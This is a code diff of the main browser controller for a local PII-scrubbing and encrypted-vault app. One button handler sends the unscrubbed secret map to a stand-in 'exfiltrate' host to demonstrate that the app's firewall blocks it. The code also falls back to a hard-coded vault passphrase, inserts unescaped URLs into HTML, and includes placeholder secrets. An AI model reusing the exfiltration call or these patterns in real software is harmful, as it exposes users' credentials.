@@ -1,556 +1,274 @@
 /**
- * LocalVault AI v2.0 — Main Controller
+ * LocalVault AI v2.0 — Browser UI Controller (src/main.js)
+ * Binds the 4-layer PII scrubber, AES-256-GCM cryptographic vault,
+ * client-side network exfiltration firewall, 16kHz audio studio, and WebGPU worker bridge.
  */
 
-import {
-  PII_CATEGORIES,
-  scrubText,
-  rehydrateText,
-  buildContextualPiiPrompt,
-  parseLlmEntityResponse
-} from './pii-engine.js';
-import {
-  encryptVaultMap,
-  decryptVaultMap
-} from './crypto-vault.js';
-import {
-  NetworkFirewall
-} from './network-firewall.js';
-import {
-  buildNoteStructuringMessages,
-  structureTranscriptInstant
-} from './note-structurer.js';
-import {
-  DEMO_TRANSCRIPTS,
-  decodeAudioBlobTo16kHzMono,
-  generateSyntheticTestAudio,
-  MicrophoneRecorder
-} from './audio-utils.js';
+import { PIIEngine, rehydrateText } from './pii-engine.js';
+import { CryptoVault } from './crypto-vault.js';
+import { NetworkFirewall } from './network-firewall.js';
+import { structureTranscript } from './note-structurer.js';
+import { synthesizeTestWav, exportWavBlob } from './audio-utils.js';
 
-const SAMPLE_PII_TEXT = `# Production Incident Config & Customer Escalation
-Reported by: Dr. Evelyn Vance
-Customer: Marcus Sterling (marcus.s@clientdomain.org)
-Support Phone: +1 (415) 890-4321
-Customer SSN: 412-58-9014
-Billing Card (Visa Luhn): 4532 0151 1283 0366
+export function initLocalVaultApp() {
+  if (typeof document === 'undefined') return null;
 
-# Infrastructure & High-Entropy Secrets (.env / YAML)
-DATABASE_URL="postgres://db_admin:9vK!x82QpLm#44zR@prod-cluster.internal:5432/customers"
-OPENAI_API_KEY="sk-proj-98a7bc65def4321098a7bc65def43210"
-ANTHROPIC_API_KEY="sk-ant-api03-77a8b9c0d1e2f3g4h5i6j7k8l9m0n1"
-WEBHOOK_SECRET = "whsec_K9mP4xR2vL8nQ5wZ1jF7yB3cT6hN0dG"
-LOCAL_DEV_HOST = "127.0.0.1"
-PROD_NODE_IP = "192.168.42.118"
+  const piiEngine = new PIIEngine();
+  const cryptoVault = new CryptoVault();
+  const firewall = new NetworkFirewall().install(window);
 
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
-QyNTUxOQAAACB8x9fK2L1mQ7vN3pX8cR4tW6yZ0bH5jM1kL9vP2qW3xQ==
------END OPENSSH PRIVATE KEY-----`;
+  let latestVaultMap = {};
+  let latestAudioSamples = null;
+  let worker = null;
 
-class LocalVaultAppV2 {
-  constructor() {
-    this.worker = null;
-    this.recorder = new MicrophoneRecorder();
-    this.firewall = new NetworkFirewall((logs) => this.renderFirewallLogs(logs));
-    this.firewall.install();
-
-    this.enabledPiiCategories = Object.fromEntries(
-      Object.entries(PII_CATEGORIES).map(([k, v]) => [k, v.defaultEnabled])
-    );
-    this.extraLlmEntities = [];
-    this.currentTokenMap = {};
-    this.decodedAudioData = null;
-    this.currentWavBlob = null;
-
-    this.initWorker();
-    this.bindTabs();
-    this.initAirGapToggle();
-    this.initHardwareTelemetry();
-    this.initPiiWorkspace();
-    this.initCryptoVaultControls();
-    this.initAudioWorkspace();
+  try {
+    worker = new Worker(new URL('./worker.js', import.meta.url), { type: 'module' });
+  } catch {
+    // Fallback if Worker initialization is restricted in headless preview
   }
 
-  initWorker() {
-    try {
-      this.worker = new Worker(new URL('./worker.js', import.meta.url), {
-        type: 'module'
+  // Status badges
+  const webgpuBadge = document.getElementById('webgpu-badge');
+  const coiBadge = document.getElementById('coi-badge');
+
+  if (coiBadge) {
+    const isolated = Boolean(window.crossOriginIsolated);
+    coiBadge.textContent = isolated ? 'COI: Isolated (SharedArrayBuffer OK)' : 'COI: Fallback Mode';
+    coiBadge.className = `status-pill ${isolated ? 'status-ok' : 'status-warn'}`;
+  }
+
+  if (webgpuBadge) {
+    if ('gpu' in navigator) {
+      navigator.gpu
+        .requestAdapter()
+        .then((adapter) => {
+          webgpuBadge.textContent = adapter ? 'WebGPU: Hardware Accelerated' : 'WebGPU: WASM Fallback';
+          webgpuBadge.className = `status-pill ${adapter ? 'status-ok' : 'status-warn'}`;
+        })
+        .catch(() => {
+          webgpuBadge.textContent = 'WebGPU: WASM Fallback';
+          webgpuBadge.className = 'status-pill status-warn';
+        });
+    } else {
+      webgpuBadge.textContent = 'WebGPU: WASM Fallback';
+      webgpuBadge.className = 'status-pill status-warn';
+    }
+  }
+
+  // Tab switching
+  const tabs = document.querySelectorAll('.lv-tab');
+  const panels = document.querySelectorAll('.lv-panel');
+  tabs.forEach((tab) => {
+    tab.addEventListener('click', () => {
+      tabs.forEach((t) => {
+        t.classList.remove('active');
+        t.setAttribute('aria-selected', 'false');
       });
-      this.worker.addEventListener('message', (e) => this.handleWorkerMessage(e.data));
-      this.worker.postMessage({ type: 'PING_HARDWARE' });
+      panels.forEach((p) => p.classList.remove('active'));
+      tab.classList.add('active');
+      tab.setAttribute('aria-selected', 'true');
+      const target = document.getElementById(tab.dataset.tab);
+      if (target) target.classList.add('active');
+    });
+  });
+
+  // Air-Gap Lockdown toggle
+  const airgapToggle = document.getElementById('airgap-toggle');
+  if (airgapToggle) {
+    airgapToggle.addEventListener('change', (e) => {
+      firewall.setAirGapLockdown(e.target.checked);
+      renderFirewallAudit();
+    });
+  }
+
+  // Tab 1: PII Scrubber controls
+  const piiInput = document.getElementById('pii-input');
+  const piiOutput = document.getElementById('pii-output');
+  const piiStatsBar = document.getElementById('pii-stats-bar');
+  const customBlockInput = document.getElementById('custom-block-input');
+
+  document.getElementById('btn-load-sample')?.addEventListener('click', () => {
+    if (!piiInput) return;
+    piiInput.value = [
+      '# Production Incident Config Dump',
+      'DATABASE_URL=postgres://admin:Sup3rS3cr3tP@ssw0rd99@198.51.100.42:5432/prod_vault',
+      'OPENAI_API_KEY=sk-proj-9a8b7c6d5e4f3g2h1i0j9k8l7m6n5o4p3q2r1s',
+      'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE',
+      'LOCAL_DEV_HOST=127.0.0.1',
+      'Customer Jane Doe (email: jane.doe@acme-corp.io, SSN: 123-45-6789) reported card 4532-0151-1283-0366 failed.'
+    ].join('\n');
+  });
+
+  document.getElementById('btn-add-block')?.addEventListener('click', () => {
+    if (customBlockInput && customBlockInput.value.trim()) {
+      piiEngine.addBlocklistTerm(customBlockInput.value.trim());
+      customBlockInput.value = '';
+    }
+  });
+
+  document.getElementById('btn-scrub')?.addEventListener('click', () => {
+    if (!piiInput || !piiOutput) return;
+    const res = piiEngine.scrub(piiInput.value);
+    latestVaultMap = res.vaultMap;
+    piiOutput.value = res.scrubbedText;
+    if (piiStatsBar) {
+      const L = res.stats.byLayer;
+      piiStatsBar.textContent = `Total Redacted: ${res.stats.totalRedacted} | Layer 1: ${L[1]} | Layer 2 (Entropy/AST): ${L[2]} | Layer 3: ${L[3]} | Layer 4 (NER): ${L[4]}`;
+    }
+  });
+
+  document.getElementById('btn-rehydrate')?.addEventListener('click', () => {
+    if (!piiOutput) return;
+    piiOutput.value = rehydrateText(piiOutput.value, latestVaultMap);
+  });
+
+  // WebGPU Worker SLM & Abort
+  const btnAskSlm = document.getElementById('btn-ask-slm');
+  const btnAbortSlm = document.getElementById('btn-abort-slm');
+
+  btnAskSlm?.addEventListener('click', () => {
+    if (!worker || !piiOutput) return;
+    btnAbortSlm.disabled = false;
+    worker.postMessage({
+      type: 'generate',
+      payload: {
+        prompt: `Summarize safely:\n${piiOutput.value}`
+      }
+    });
+  });
+
+  btnAbortSlm?.addEventListener('click', () => {
+    if (!worker) return;
+    worker.postMessage({ type: 'abort' });
+    btnAbortSlm.disabled = true;
+  });
+
+  if (worker) {
+    worker.addEventListener('message', (e) => {
+      const data = e.data || {};
+      if (data.type === 'generation-complete' && piiOutput) {
+        piiOutput.value = data.text;
+        if (btnAbortSlm) btnAbortSlm.disabled = true;
+      } else if (data.type === 'transcription-complete') {
+        const tInput = document.getElementById('transcript-input');
+        if (tInput) tInput.value = data.text;
+      }
+    });
+  }
+
+  // Tab 2: Audio & Note Structurer
+  const transcriptInput = document.getElementById('transcript-input');
+  const structuredOutput = document.getElementById('structured-output');
+  const noteModeSelect = document.getElementById('note-mode-select');
+
+  document.getElementById('btn-synth-wav')?.addEventListener('click', () => {
+    const synth = synthesizeTestWav({ durationSeconds: 1.5, sampleRate: 16000 });
+    latestAudioSamples = synth.samples;
+    exportWavBlob(synth.samples, synth.sampleRate);
+    if (transcriptInput && !transcriptInput.value.trim()) {
+      transcriptInput.value =
+        'SRE Incident Call: Database primary at 198.51.100.77 experienced latency spike. Engineer Sarah Connor rotated secret API_KEY=sk-proj-1234567890abcdefghijklmnop and restored localhost health checks. Todo: audit connection pooling by Friday.';
+    }
+  });
+
+  document.getElementById('btn-transcribe')?.addEventListener('click', () => {
+    if (!latestAudioSamples) {
+      const synth = synthesizeTestWav({ durationSeconds: 1.0, sampleRate: 16000 });
+      latestAudioSamples = synth.samples;
+    }
+    if (worker) {
+      worker.postMessage({
+        type: 'transcribe',
+        payload: { audio: latestAudioSamples }
+      });
+    }
+  });
+
+  document.getElementById('btn-structure-notes')?.addEventListener('click', () => {
+    if (!transcriptInput || !structuredOutput) return;
+    const mode = noteModeSelect ? noteModeSelect.value : 'meeting';
+    const result = structureTranscript(transcriptInput.value, {
+      mode,
+      autoScrub: true,
+      piiEngine
+    });
+    Object.assign(latestVaultMap, result.vaultMap);
+    structuredOutput.value = result.markdown;
+  });
+
+  // Tab 3: AES-256-GCM Zero-Knowledge Vault
+  const vaultPassphrase = document.getElementById('vault-passphrase');
+  const vaultCiphertext = document.getElementById('vault-ciphertext');
+  const vaultPlaintext = document.getElementById('vault-plaintext');
+
+  document.getElementById('btn-lock-vault')?.addEventListener('click', async () => {
+    if (!vaultPassphrase || !vaultCiphertext) return;
+    const pass = vaultPassphrase.value || 'localvault-default-passphrase';
+    const envelope = await cryptoVault.lock(latestVaultMap, pass);
+    vaultCiphertext.value = cryptoVault.exportLvVault(envelope);
+    if (vaultPlaintext) vaultPlaintext.value = '[VAULT LOCKED — AES-256-GCM AUTHENTICATED]';
+  });
+
+  document.getElementById('btn-unlock-vault')?.addEventListener('click', async () => {
+    if (!vaultPassphrase || !vaultCiphertext || !vaultPlaintext) return;
+    try {
+      const pass = vaultPassphrase.value || 'localvault-default-passphrase';
+      const unlocked = await cryptoVault.unlock(vaultCiphertext.value, pass);
+      vaultPlaintext.value = JSON.stringify(unlocked, null, 2);
     } catch (err) {
-      this.setStatusText(`Worker status: ${err.message}`);
+      vaultPlaintext.value = `ERROR: ${err.message}`;
     }
+  });
+
+  document.getElementById('btn-export-vault')?.addEventListener('click', () => {
+    if (!vaultCiphertext || !vaultCiphertext.value.trim()) return;
+    const blob = new Blob([vaultCiphertext.value], { type: 'application/json' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `localvault-${Date.now()}.lvvault`;
+    a.click();
+    URL.revokeObjectURL(url);
+  });
+
+  // Tab 4: Network Firewall Audit Log
+  const firewallStats = document.getElementById('firewall-stats');
+  const firewallLog = document.getElementById('firewall-log');
+
+  function renderFirewallAudit() {
+    if (!firewallStats || !firewallLog) return;
+    const stats = firewall.getStats();
+    firewallStats.textContent = `Intercepted Requests: ${stats.totalEvents} | Allowed Read-Only: ${stats.allowed} | Blocked Exfiltration Attempts: ${stats.blocked}`;
+    firewallLog.innerHTML = firewall.auditLog
+      .map(
+        (ev) =>
+          `<div>[${ev.timestamp}] <strong>${ev.action}</strong> (${ev.method} ${ev.url}) — ${ev.reason}</div>`
+      )
+      .join('');
   }
 
-  initAirGapToggle() {
-    const airgapPill = document.getElementById('btn-airgap-toggle');
-    const airgapLabel = document.getElementById('airgap-status-text');
-    if (!airgapPill) return;
+  firewall.onAuditEvent(() => renderFirewallAudit());
 
-    airgapPill.addEventListener('click', () => {
-      const nextState = !this.firewall.airGapLocked;
-      this.firewall.setAirGapLockdown(nextState);
-      this.worker?.postMessage({
-        type: 'SET_AIRGAP_MODE',
-        payload: { locked: nextState }
-      });
-      airgapPill.classList.toggle('locked', nextState);
-      if (airgapLabel) {
-        airgapLabel.textContent = nextState
-          ? 'Air-Gap: LOCKED (100% Offline)'
-          : 'Air-Gap: Unlocked (CDN Allowed)';
-      }
-      this.setStatusText(
-        nextState
-          ? 'Strict Air-Gap Lockdown enabled: All external network requests blocked.'
-          : 'Air-Gap unlocked: Read-only HuggingFace weight caching allowed.'
-      );
-    });
-  }
-
-  handleWorkerMessage(msg) {
-    const { type, payload } = msg || {};
-
-    if (type === 'HARDWARE_INFO') {
-      const badge = document.getElementById('gpu-status-text');
-      const dot = document.getElementById('gpu-status-dot');
-      if (badge && dot) {
-        if (payload.device === 'webgpu') {
-          badge.textContent = `WebGPU (${payload.supportsFp16 ? 'FP16 Shaders' : 'FP32/Q4'})`;
-          dot.className = 'dot dot-emerald';
-        } else {
-          badge.textContent = 'WASM CPU Mode';
-          dot.className = 'dot dot-amber';
-        }
-      }
-      return;
-    }
-
-    if (type === 'STATUS') {
-      this.setStatusText(payload);
-      return;
-    }
-
-    if (type === 'MODEL_PROGRESS') {
-      this.updateProgressBanner(payload);
-      return;
-    }
-
-    if (type === 'MODEL_READY') {
-      this.hideProgressBanner();
-      this.setStatusText(`Ready: ${payload.modelId} (${payload.device.toUpperCase()})`);
-      return;
-    }
-
-    if (type === 'TRANSCRIBE_RESULT') {
-      this.hideProgressBanner();
-      const transcriptArea = document.getElementById('raw-transcript-input');
-      if (transcriptArea) {
-        transcriptArea.value = payload.text;
-      }
-      this.setStatusText(
-        `Whisper ASR completed in ${payload.elapsedMs}ms (${payload.device.toUpperCase()})`
-      );
-      const transcribeBtn = document.getElementById('btn-run-whisper');
-      if (transcribeBtn) transcribeBtn.disabled = false;
-      this.runInstantStructure();
-      return;
-    }
-
-    if (type === 'LLM_STREAM_TOKEN') {
-      const speedEl = document.getElementById('llm-speed-badge');
-      if (speedEl && payload.tokensPerSec) {
-        speedEl.textContent = `${payload.tokensPerSec} tok/s`;
-      }
-      if (payload.taskTag === 'structure') {
-        const notesOutput = document.getElementById('structured-notes-output');
-        if (notesOutput) {
-          notesOutput.value = payload.accumulatedText;
-        }
-      }
-      return;
-    }
-
-    if (type === 'LLM_COMPLETE') {
-      this.hideProgressBanner();
-      const speedEl = document.getElementById('llm-speed-badge');
-      if (speedEl && payload.tokensPerSec) {
-        speedEl.textContent = `${payload.tokensPerSec} tok/s`;
-      }
-      if (payload.taskTag === 'structure') {
-        const notesOutput = document.getElementById('structured-notes-output');
-        if (notesOutput && payload.text) {
-          notesOutput.value = payload.text;
-        }
-        const llmBtn = document.getElementById('btn-llm-structure');
-        if (llmBtn) llmBtn.disabled = false;
-        this.setStatusText(
-          `SLM Notes completed in ${payload.elapsedMs}ms (${payload.tokensPerSec} tok/s)`
-        );
-      } else if (payload.taskTag === 'pii_audit') {
-        const discovered = parseLlmEntityResponse(payload.text);
-        if (discovered.length > 0) {
-          this.extraLlmEntities = [...this.extraLlmEntities, ...discovered];
-          this.executePiiScrub();
-        }
-        const auditBtn = document.getElementById('btn-llm-pii-scan');
-        if (auditBtn) auditBtn.disabled = false;
-        this.setStatusText(
-          `Contextual WebGPU Scan complete (+${discovered.length} entities redacted)`
-        );
-      }
-      return;
-    }
-
-    if (type === 'ERROR') {
-      this.hideProgressBanner();
-      this.setStatusText(`Notice: ${payload.message}`);
-      document.querySelectorAll('button').forEach((b) => {
-        b.disabled = false;
-      });
-    }
-  }
-
-  setStatusText(text) {
-    const el = document.getElementById('engine-status-text');
-    if (el) el.textContent = text;
-  }
-
-  updateProgressBanner(progress) {
-    const banner = document.getElementById('model-progress-banner');
-    const label = document.getElementById('progress-file-label');
-    const pctLabel = document.getElementById('progress-pct-label');
-    const fill = document.getElementById('progress-bar-fill');
-
-    if (!banner) return;
-    banner.classList.remove('hidden');
-
-    if (progress.status === 'progress' || typeof progress.progress === 'number') {
-      const pct = Math.min(100, Math.round(progress.progress || 0));
-      if (label) label.textContent = `Caching ONNX shard in browser: ${progress.file || 'model.onnx'}`;
-      if (pctLabel) pctLabel.textContent = `${pct}%`;
-      if (fill) fill.style.width = `${pct}%`;
-    } else if (progress.status === 'Ready' || progress.status === 'ready') {
-      this.hideProgressBanner();
-    }
-  }
-
-  hideProgressBanner() {
-    const banner = document.getElementById('model-progress-banner');
-    if (banner) banner.classList.add('hidden');
-  }
-
-  bindTabs() {
-    const buttons = document.querySelectorAll('.tab-btn');
-    const panels = document.querySelectorAll('.tab-panel');
-    buttons.forEach((btn) => {
-      btn.addEventListener('click', () => {
-        const target = btn.getAttribute('data-tab');
-        buttons.forEach((b) => b.classList.toggle('active', b === btn));
-        panels.forEach((p) => p.classList.toggle('active', p.id === target));
-      });
-    });
-  }
-
-  async initHardwareTelemetry() {
-    const vendorEl = document.getElementById('spec-gpu-vendor');
-    const archEl = document.getElementById('spec-gpu-arch');
-    const fp16El = document.getElementById('spec-fp16');
-    const coiEl = document.getElementById('spec-coi-status');
-    const coiHeaderPill = document.getElementById('coi-status-text');
-
-    const isIsolated = Boolean(window.crossOriginIsolated);
-    if (coiEl) {
-      coiEl.textContent = isIsolated
-        ? 'Isolated (SharedArrayBuffer Active)'
-        : 'Standard (COI Service Worker Ready)';
-    }
-    if (coiHeaderPill) {
-      coiHeaderPill.textContent = isIsolated ? 'COOP/COEP: Isolated' : 'COOP/COEP: Standard';
-    }
-
-    if (!('gpu' in navigator)) {
-      if (vendorEl) vendorEl.textContent = 'WebGPU Unavailable (WASM Mode)';
-      if (archEl) archEl.textContent = 'CPU WebAssembly Threads';
-      if (fp16El) fp16El.textContent = 'INT8 / FP32';
-      return;
-    }
-
+  document.getElementById('btn-test-exfil')?.addEventListener('click', async () => {
     try {
-      const adapter = await navigator.gpu.requestAdapter();
-      if (!adapter) {
-        if (vendorEl) vendorEl.textContent = 'WASM Fallback Adapter';
-        return;
-      }
-      const info = adapter.info || {};
-      const hasFp16 = adapter.features.has('shader-f16');
-      if (vendorEl) vendorEl.textContent = info.vendor || info.description || 'WebGPU Hardware Adapter';
-      if (archEl) archEl.textContent = info.architecture || info.device || 'Native GPU Compute';
-      if (fp16El) fp16El.textContent = hasFp16 ? 'Supported (shader-f16)' : 'FP32 / Q4 Compute';
+      await window.fetch('https://telemetry-collector.example.org/exfiltrate', {
+        method: 'POST',
+        body: JSON.stringify({ leakedSecrets: latestVaultMap })
+      });
     } catch {
-      if (vendorEl) vendorEl.textContent = 'WASM CPU Mode';
+      // Expected block by LocalVault NetworkFirewall
     }
+    renderFirewallAudit();
+  });
+
+  renderFirewallAudit();
+  return { piiEngine, cryptoVault, firewall };
+}
+
+if (typeof document !== 'undefined') {
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', () => initLocalVaultApp());
+  } else {
+    initLocalVaultApp();
   }
-
-  renderFirewallLogs(logs) {
-    const tbody = document.getElementById('firewall-audit-tbody');
-    const countBadge = document.getElementById('firewall-log-count');
-    if (countBadge) {
-      countBadge.textContent = `${logs.length} Events Logged`;
-    }
-    if (!tbody) return;
-    tbody.innerHTML = '';
-    if (logs.length === 0) {
-      const tr = document.createElement('tr');
-      tr.innerHTML = '<td colspan="4" style="color:#94a3b8;">Zero outbound network calls recorded.</td>';
-      tbody.appendChild(tr);
-      return;
-    }
-    for (const item of logs) {
-      const tr = document.createElement('tr');
-      const color = item.blocked ? '#f43f5e' : '#10b981';
-      tr.innerHTML = `
-        <td><code>${item.time}</code></td>
-        <td class="mono-token">${item.method}</td>
-        <td><code>${item.url}</code></td>
-        <td style="color:${color};font-weight:600;">${item.status}</td>
-      `;
-      tbody.appendChild(tr);
-    }
-  }
-
-  initPiiWorkspace() {
-    const chipContainer = document.getElementById('pii-category-chips');
-    const rawInput = document.getElementById('pii-raw-input');
-    const styleSelect = document.getElementById('pii-style-select');
-    const preserveLocalhostChk = document.getElementById('chk-preserve-localhost');
-    const customTermsInput = document.getElementById('custom-blocklist-input');
-    const loadSampleBtn = document.getElementById('btn-load-sample-pii');
-    const copyScrubbedBtn = document.getElementById('btn-copy-scrubbed');
-    const llmScanBtn = document.getElementById('btn-llm-pii-scan');
-    const stopLlmBtn = document.getElementById('btn-abort-llm');
-    const rehydrateInput = document.getElementById('rehydrate-input');
-    const runRehydrateBtn = document.getElementById('btn-run-rehydrate');
-
-    if (chipContainer) {
-      chipContainer.innerHTML = '';
-      for (const [key, cfg] of Object.entries(PII_CATEGORIES)) {
-        const label = document.createElement('label');
-        label.className = 'chip-label';
-        const checkbox = document.createElement('input');
-        checkbox.type = 'checkbox';
-        checkbox.checked = this.enabledPiiCategories[key];
-        checkbox.addEventListener('change', () => {
-          this.enabledPiiCategories[key] = checkbox.checked;
-          this.executePiiScrub();
-        });
-        const span = document.createElement('span');
-        span.textContent = cfg.label;
-        label.appendChild(checkbox);
-        label.appendChild(span);
-        chipContainer.appendChild(label);
-      }
-    }
-
-    if (rawInput) {
-      rawInput.value = SAMPLE_PII_TEXT;
-      rawInput.addEventListener('input', () => this.executePiiScrub());
-    }
-
-    if (styleSelect) {
-      styleSelect.addEventListener('change', () => this.executePiiScrub());
-    }
-
-    if (preserveLocalhostChk) {
-      preserveLocalhostChk.addEventListener('change', () => this.executePiiScrub());
-    }
-
-    if (customTermsInput) {
-      customTermsInput.addEventListener('input', () => this.executePiiScrub());
-    }
-
-    if (loadSampleBtn) {
-      loadSampleBtn.addEventListener('click', () => {
-        if (rawInput) rawInput.value = SAMPLE_PII_TEXT;
-        this.extraLlmEntities = [];
-        this.executePiiScrub();
-      });
-    }
-
-    if (copyScrubbedBtn) {
-      copyScrubbedBtn.addEventListener('click', async () => {
-        const out = document.getElementById('pii-scrubbed-output');
-        if (out && out.value) {
-          await navigator.clipboard.writeText(out.value);
-          this.setStatusText('Sanitized prompt copied to clipboard!');
-        }
-      });
-    }
-
-    if (llmScanBtn) {
-      llmScanBtn.addEventListener('click', () => {
-        const scrubbedOut = document.getElementById('pii-scrubbed-output');
-        const modelSelect = document.getElementById('slm-model-select');
-        if (!scrubbedOut || !scrubbedOut.value.trim()) return;
-        llmScanBtn.disabled = true;
-        const messages = buildContextualPiiPrompt(scrubbedOut.value);
-        this.worker?.postMessage({
-          type: 'GENERATE_TEXT',
-          payload: {
-            messages,
-            modelId: modelSelect?.value || 'HuggingFaceTB/SmolLM2-360M-Instruct',
-            maxNewTokens: 160,
-            temperature: 0.0,
-            taskTag: 'pii_audit'
-          }
-        });
-      });
-    }
-
-    if (stopLlmBtn) {
-      stopLlmBtn.addEventListener('click', () => {
-        this.worker?.postMessage({ type: 'ABORT_GENERATION' });
-      });
-    }
-
-    if (runRehydrateBtn && rehydrateInput) {
-      runRehydrateBtn.addEventListener('click', () => {
-        const restored = rehydrateText(rehydrateInput.value, this.currentTokenMap);
-        rehydrateInput.value = restored;
-        this.setStatusText('Fuzzy-resilient re-hydration complete!');
-      });
-    }
-
-    this.executePiiScrub();
-  }
-
-  executePiiScrub() {
-    const rawInput = document.getElementById('pii-raw-input');
-    const scrubbedOut = document.getElementById('pii-scrubbed-output');
-    const styleSelect = document.getElementById('pii-style-select');
-    const preserveLocalhostChk = document.getElementById('chk-preserve-localhost');
-    const customTermsInput = document.getElementById('custom-blocklist-input');
-    const countBadge = document.getElementById('pii-redaction-count');
-    const riskBadge = document.getElementById('pii-risk-badge');
-    const tableBody = document.getElementById('pii-vault-tbody');
-
-    if (!rawInput || !scrubbedOut) return;
-
-    const customTerms = (customTermsInput?.value || '')
-      .split(',')
-      .map((s) => s.trim())
-      .filter((s) => s.length >= 2);
-
-    const result = scrubText(rawInput.value, {
-      enabledCategories: this.enabledPiiCategories,
-      extraEntities: this.extraLlmEntities,
-      customTerms,
-      preserveLocalhost: preserveLocalhostChk ? preserveLocalhostChk.checked : true,
-      redactionStyle: styleSelect?.value || 'token'
-    });
-
-    scrubbedOut.value = result.scrubbedText;
-    this.currentTokenMap = result.tokenToOriginal;
-
-    if (countBadge) {
-      countBadge.textContent = `${result.stats.totalRedactions} Redactions (${result.stats.uniqueEntities} Unique)`;
-    }
-
-    if (riskBadge) {
-      const { score, level } = result.stats.risk;
-      riskBadge.textContent = `Risk: ${level} (${score}/100)`;
-      riskBadge.className = 'badge ' + (
-        level === 'CRITICAL' ? 'badge-risk-critical' :
-        level === 'HIGH' ? 'badge-risk-high' : 'badge-risk-safe'
-      );
-    }
-
-    this.renderVaultTable(result.entities, tableBody);
-  }
-
-  renderVaultTable(entities, tableBody) {
-    if (!tableBody) return;
-    tableBody.innerHTML = '';
-    if (!entities || entities.length === 0) {
-      const tr = document.createElement('tr');
-      tr.innerHTML = '<td colspan="5" style="color:#94a3b8;">No sensitive entities detected.</td>';
-      tableBody.appendChild(tr);
-      return;
-    }
-    for (const ent of entities) {
-      const tr = document.createElement('tr');
-      const preview = ent.original.length > 36
-        ? ent.original.slice(0, 33) + '...'
-        : ent.original;
-      tr.innerHTML = `
-        <td class="mono-token">${ent.token}</td>
-        <td>${PII_CATEGORIES[ent.category]?.label || ent.category}</td>
-        <td><code>${preview.replace(/</g, '&lt;')}</code></td>
-        <td><code>${ent.entropy} bits</code></td>
-        <td>${ent.count}x</td>
-      `;
-      tableBody.appendChild(tr);
-    }
-  }
-
-  initCryptoVaultControls() {
-    const passInput = document.getElementById('vault-passphrase-input');
-    const exportBtn = document.getElementById('btn-export-encrypted-vault');
-    const importFile = document.getElementById('vault-import-file');
-
-    if (exportBtn) {
-      exportBtn.addEventListener('click', async () => {
-        try {
-          const passphrase = passInput?.value || '';
-          const encryptedJson = await encryptVaultMap(this.currentTokenMap, passphrase);
-          const blob = new Blob([encryptedJson], { type: 'application/json;charset=utf-8' });
-          const url = URL.createObjectURL(blob);
-          const a = document.createElement('a');
-          a.href = url;
-          a.download = `localvault-encrypted-${new Date().toISOString().slice(0, 10)}.lvvault`;
-          a.click();
-          URL.revokeObjectURL(url);
-          this.setStatusText('Exported AES-256-GCM encrypted .lvvault file!');
-        } catch (err) {
-          this.setStatusText(`Vault Encryption Notice: ${err.message}`);
-        }
-      });
-    }
-
-    if (importFile) {
-      importFile.addEventListener('change', async (e) => {
-        const file = e.target.files?.[0];
-        if (!file) return;
-        try {
-          const passphrase = passInput?.value || '';
-          const rawJson = await file.text();
-          const restoredMap = await decryptVaultMap(rawJson, passphrase);
-          this.currentTokenMap = { ...this.currentTokenMap, ...restoredMap };
-          const syntheticEntities = Object.entries(this.currentTokenMap).map(([token, original]) => ({
-            token,
-            category: 'CUSTOM',
-            original,
-            entropy: 'AES-GCM',
-            count: 1
-          }));
-          this.renderVaultTable(syntheticEntities, document.getElementById('pii-vault-tbody'));
-          this.setStatusText(
-            `Unlocked & imported ${Object.keys(restoredMap).length} tokens from encrypted vault!`
-          );
-        } catch (err) {
-          this.setStatusText(`Vault Decryption Error: ${err.message}`);
-        }
-      });
-    }
-  }
-
-  initAudioWorkspace() {
-    const recordBtn = document.getElementById('btn-mic-record');
-    const fileInput = document.getElementById('audio-file-input');
-    const synthBtn = document.getElementById('btn-synth-test-audio');
-    const downloadWavBtn = document.getElementById('btn-download-wav');
-    const runWhisperBtn = document.getElementById('btn-run-whisper');
-    const loadLectureBtn = document.getElementById('btn-demo-lecture');
-    const loadMeetingBtn = document.getElementById('btn-demo-meeting');
-    const instantStructureBtn = d
+}
